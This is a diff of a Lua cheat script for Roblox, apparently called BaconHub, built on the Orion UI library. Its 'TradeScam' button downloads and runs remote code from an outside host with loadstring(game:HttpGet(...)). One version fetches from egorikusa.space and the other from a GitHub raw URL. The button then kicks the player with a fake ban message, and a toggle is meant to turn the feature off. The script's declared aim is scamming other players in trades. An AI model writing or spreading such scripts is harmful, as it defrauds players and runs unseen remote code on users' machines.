@@ -1,39 +1,39 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "BaconHub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", Draggable = true})
+local Window = OrionLib:MakeWindow({
+    Name = "BaconHub",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "OrionTest",
+    Draggable = true
+})
 local Tab = Window:MakeTab({
     Name = "Main",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
-OrionLib:MakeNotification({
-    Name = "Title!",
-    Content = "Notification content... what will it say??",
-    Image = "rbxassetid://4483345998",
-    Time = 5
-})
 
-local executedTradeScam = false
+local isTradeScamClicked = false
 
 Tab:AddButton({
-    Name = "Tradescam",
+    Name = "TradeScam",
     Callback = function()
-        if not executedTradeScam then
-            loadstring(game:HttpGet('https://egorikusa.space/b06889a82f5083008a79019f.lua'))()
-            executedTradeScam = true
-            wait(8)
-            if executedTradeScam then
-                game.Players.LocalPlayer:Kick("u banned for using TradeScam")
+        if not isTradeScamClicked then
+            isTradeScamClicked = true
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/ee313b9e2cc73cdc95c434f5.lua'))()
+            wait(10)
+            if isTradeScamClicked then
+                game.Players.LocalPlayer:Kick("You have been kicked for using TradeScam.")
             end
         end
-    end    
+    end
 })
 
-local turnOffToggle = Tab:AddToggle({
-    Name = "Turn off TradeScam",
+Tab:AddToggle({
+    Name = "Turn off Tradescam",
     Default = false,
-    Callback = function(Value)
-        executedTradeScam = not Value
-    end    
+    Callback = function(value)
+        isTradeScamClicked = not value
+    end
 })
 
 OrionLib:Init()
